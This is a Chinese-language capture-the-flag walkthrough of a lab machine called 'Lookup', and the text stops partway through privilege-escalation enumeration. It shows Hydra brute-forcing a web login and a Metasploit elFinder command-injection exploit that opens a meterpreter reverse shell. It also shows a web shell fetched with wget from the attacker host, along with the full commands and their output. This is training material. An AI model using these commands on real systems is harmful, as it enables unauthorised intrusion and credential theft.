<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/yiyi/tmp]</span><br><span class="line">└─<span class="comment"># ffuf -c -u http://$IP -H &quot;Host: FUZZ.lookup.hmv&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --fs 0</span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.lookup.hmv</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 0</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">:: Progress: [19966/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 19966 ::</span></span><br></pre></td></tr></table></figure>

<p>海德拉爆破账密</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/yiyi/tmp]</span><br><span class="line">└─<span class="comment"># hydra -l admin -P /root/yiyi/rockyou.txt -f lookup.hmv http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong password&quot; </span></span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-18 05:11:41</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task</span><br><span class="line">[DATA] attacking http-post-form://lookup.hmv:80/login.php:username=^USER^&amp;password=^PASS^:Wrong password</span><br><span class="line">[80][http-post-form] host: lookup.hmv   login: admin   password: password123</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> lookup.hmv (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-18 05:12:01</span><br></pre></td></tr></table></figure>

<p>不显示password错误了，说明账号有问题</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241218181325527.png" alt="image-20241218181325527"></p>
<p>重新爆</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/yiyi/tmp]</span><br><span class="line">└─<span class="comment"># hydra -L /root/yiyi/rockyou.txt -p password123 -f lookup.hmv http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong username&quot; </span></span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-18 05:15:44</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:14344399/p:1), ~896525 tries per task</span><br><span class="line">[DATA] attacking http-post-form://lookup.hmv:80/login.php:username=^USER^&amp;password=^PASS^:Wrong username</span><br><span class="line">[STATUS] 4577.00 tries/min, 4577 tries <span class="keyword">in</span> 00:01h, 14339822 to <span class="keyword">do</span> <span class="keyword">in</span> 52:14h, 16 active</span><br><span class="line">[80][http-post-form] host: lookup.hmv   login: jose   password: password123</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> lookup.hmv (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-18 05:18:28</span><br></pre></td></tr></table></figure>

<p>登陆后跳转<a target="_blank" rel="noopener" href="http://files.lookup.hmv/">files.lookup.hmv</a><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241218182247520.png" alt="image-20241218182247520"></p>
<p>写入hosts</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># echo 192.168.56.101 lookup.hmv files.lookup.hmv &gt; /etc/hosts</span></span><br></pre></td></tr></table></figure>

<p>进入了这么个东西</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241218182712399.png" alt="image-20241218182712399"></p>
<p>拿dirsearch扫 扫出了个&#x2F;elFinder&#x2F;Changelog</p>
<p>看到了版本</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241218183029749.png" alt="image-20241218183029749"></p>
<p>直接找洞打</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/tmp]</span><br><span class="line">└─<span class="comment"># msfconsole</span></span><br><span class="line">Metasploit tip: Metasploit can be configured at startup, see msfconsole </span><br><span class="line">--<span class="built_in">help</span> to learn more</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line"> ______________________________________________________________________________</span><br><span class="line">|                                                                              |</span><br><span class="line">|                          3Kom SuperHack II Logon                             |</span><br><span class="line">|______________________________________________________________________________|</span><br><span class="line">|                                                                              |</span><br><span class="line">|                                                                              |</span><br><span class="line">|                                                                              |</span><br><span class="line">|                 User Name:          [   security    ]                        |</span><br><span class="line">|                                                                              |</span><br><span class="line">|                 Password:           [               ]                        |</span><br><span class="line">|                                                                              |</span><br><span class="line">|                                                                              |</span><br><span class="line">|                                                                              |</span><br><span class="line">|                                   [ OK ]                                     |</span><br><span class="line">|______________________________________________________________________________|</span><br><span class="line">|                                                                              |</span><br><span class="line">|                                                       https://metasploit.com |</span><br><span class="line">|______________________________________________________________________________|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.4.34-dev                          ]</span><br><span class="line">+ -- --=[ 2461 exploits - 1267 auxiliary - 431 post       ]</span><br><span class="line">+ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">[*] Starting persistent handler(s)...</span><br><span class="line">msf6 &gt; search elfinder </span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                                               Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                                               ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution</span><br><span class="line">   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability</span><br><span class="line">   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution</span><br><span class="line">   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection</span><br><span class="line">   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection</span><br><span class="line"></span><br><span class="line">msf6 &gt; use 4</span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT      80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /elFinder/       <span class="built_in">yes</span>       The base path to elFinder</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.160.100  <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Auto</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) &gt; <span class="built_in">set</span> rhosts files.lookup.hmv</span><br><span class="line">rhosts =&gt; files.lookup.hmv</span><br><span class="line">msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.160.100:4444 </span><br><span class="line">[*] Uploading payload <span class="string">&#x27;TWV0K4.jpg;echo 6370202e2e2f66696c65732f545756304b342e6a70672a6563686f2a202e625637636e76474134342e706870 |xxd -r -p |sh&amp; #.jpg&#x27;</span> (1962 bytes)</span><br><span class="line">[*] Triggering vulnerability via image rotation ...</span><br><span class="line">[*] Executing payload (/elFinder/php/.bV7cnvGA44.php) ...</span><br><span class="line">[*] Removing uploaded file ...</span><br><span class="line">[+] Deleted uploaded file</span><br><span class="line">[!] This exploit may require manual cleanup of <span class="string">&#x27;.bV7cnvGA44.php&#x27;</span> on the target</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting   Required  Description</span><br><span class="line">   ----       ---------------   --------  -----------</span><br><span class="line">   Proxies                      no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS     files.lookup.hmv  <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT      80                <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>             no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /elFinder/        <span class="built_in">yes</span>       The base path to elFinder</span><br><span class="line">   VHOST                        no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.160.100  <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Auto</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) &gt; <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">[*] <span class="built_in">exec</span>: <span class="built_in">cat</span> /etc/hosts</span><br><span class="line"></span><br><span class="line">192.168.56.101 lookup.hmv files.lookup.hmv</span><br><span class="line">msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) &gt; <span class="built_in">set</span> lhost 192.168.56.102</span><br><span class="line">lhost =&gt; 192.168.56.102</span><br><span class="line">msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.102:4444 </span><br><span class="line">[*] Uploading payload <span class="string">&#x27;EZcGr0.jpg;echo 6370202e2e2f66696c65732f455a634772302e6a70672a6563686f2a202e56375273615774702e706870 |xxd -r -p |sh&amp; #.jpg&#x27;</span> (1943 bytes)</span><br><span class="line">[*] Triggering vulnerability via image rotation ...</span><br><span class="line">[*] Executing payload (/elFinder/php/.V7RsaWtp.php) ...</span><br><span class="line">[*] Sending stage (40004 bytes) to 192.168.56.101</span><br><span class="line">[+] Deleted .V7RsaWtp.php</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.56.102:4444 -&gt; 192.168.56.101:34062) at 2024-12-18 05:37:25 -0500</span><br><span class="line">[*] No reply</span><br><span class="line">[*] Removing uploaded file ...</span><br><span class="line">[+] Deleted uploaded file</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell -t</span><br><span class="line">[*] <span class="built_in">env</span> TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null</span><br><span class="line">Process 2694 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">www-data@lookup:/var/www/files.lookup.hmv/public_html/elFinder/php$ </span><br></pre></td></tr></table></figure>

<p>传个马进来维持权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@lookup:/var/www/files.lookup.hmv/public_html$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">elFinder  index.php</span><br><span class="line">www-data@lookup:/var/www/files.lookup.hmv/public_html$  wget http://192.168.56.102/shell.php</span><br><span class="line">02/shell.php/192.168.56.10</span><br><span class="line">--2024-12-18 18:41:56--  http://192.168.56.102/shell.php</span><br><span class="line">Connecting to 192.168.56.102:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 2489 (2.4K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;shell.php&#x27;</span></span><br><span class="line"></span><br><span class="line">shell.php           100%[===================&gt;]   2.43K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2024-12-18 18:41:56 (313 MB/s) - <span class="string">&#x27;shell.php&#x27;</span> saved [2489/2489]</span><br></pre></td></tr></table></figure>

<p>这边监听，那边访问<a target="_blank" rel="noopener" href="http://files.lookup.hmv/shell.php">http://files.lookup.hmv/elFinder/Changelog</a></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241218184334651.png" alt="image-20241218184334651"></p>
<p>查看suid</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@lookup:/$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/snap/snapd/19457/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core20/1950/usr/bin/chfn</span><br><span class="line">/snap/core20/1950/usr/bin/chsh</span><br><span class="line">/snap/core20/1950/usr/bin/gpasswd</span><br><span class="line">/snap/core20/1950/usr/bin/mount</span><br><span class="line">/snap/core20/1950/usr/bin/newgrp</span><br><span class="line">/snap/core20/1950/usr/bin/passwd</span><br><span class="line">/snap/core20/1950/usr/bin/su</span><br><span class="line">/snap/core20/1950/usr/bin/sudo</span><br><span class="line">/snap/core20/1950/usr/bin/umount</span><br><span class="line">/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core20/1950/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core20/1974/usr/bin/chfn</span><br><span class="line">/snap/core20/1974/usr/bin/chsh</span><br><span class="line">/snap/core20/1974/usr/bin/gpasswd</span><br><span class="line">/snap/core20/1974/usr/bin/mount</span><br><span class="line">/snap/core20/1974/usr/bin/newgrp</span><br><span class="line">/snap/core20/1974/usr/bin/passwd</span><br><span class="line">/snap/core20/1974/usr/bin/su</span><br><span class="line">/snap/core20/1974/usr/bin/sudo</span><br><span class="line">/snap/core20/1974/usr/bin/umount</span><br><span class="line">/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core20/1974/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/sbin/pwm</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/umount</span><br></pre></td></tr></table></figure>

<p>有个pwn，可以看看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">www-data@lookup:/$ strings /usr/sbin/pwm</span><br><span class="line">strings /usr/sbin/pwm</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">libc.so.6</span><br><span class="line">fopen</span><br><span class="line">perror</span><br><span class="line">puts</span><br><span class="line">__stack_chk_fail</span><br><span class="line">putchar</span><br><span class="line">popen</span><br><span class="line">fgetc</span><br><span class="line">__isoc99_fscanf</span><br><span class="line">fclose</span><br><span class="line">pclose</span><br><span class="line">__cxa_finalize</span><br><span class="line">__libc_start_main</span><br><span class="line">snprintf</span><br><span class="line">GLIBC_2.4</span><br><span class="line">GLIBC_2.7</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">u+UH</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">[!] Running <span class="string">&#x27;id&#x27;</span> <span class="built_in">command</span> to extract the username and user ID (UID)</span><br><span class="line">[-] Error executing <span class="built_in">id</span> <span class="built_in">command</span></span><br><span class="line">uid=%*u(%[^)])</span><br><span class="line">[-] Error reading username from <span class="built_in">id</span> <span class="built_in">command</span></span><br><span class="line">[!] ID: %s</span><br><span class="line">/home/%s/.passwords</span><br><span class="line">[-] File /home/%s/.passwords not found</span><br><span class="line">:*3$<span class="string">&quot;</span></span><br><span class="line"><span class="string">GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0</span></span><br><span class="line"><span class="string">crtstuff.c</span></span><br><span class="line"><span class="string">deregister_tm_clones</span></span><br><span class="line"><span class="string">__do_global_dtors_aux</span></span><br><span class="line"><span class="string">completed.8061</span></span><br><span class="line"><span class="string">__do_global_dtors_aux_fini_array_entry</span></span><br><span class="line"><span class="string">frame_dummy</span></span><br><span class="line"><span class="string">__frame_dummy_init_array_entry</span></span><br><span class="line"><span class="string">pwm.c</span></span><br><span class="line"><span class="string">__FRAME_END__</span></span><br><span class="line"><span class="string">__init_array_end</span></span><br><span class="line"><span class="string">_DYNAMIC</span></span><br><span class="line"><span class="string">__init_array_start</span></span><br><span class="line"><span class="string">__GNU_EH_FRAME_HDR</span></span><br><span class="line"><span class="string">_GLOBAL_OFFSET_TABLE_</span></span><br><span class="line"><span 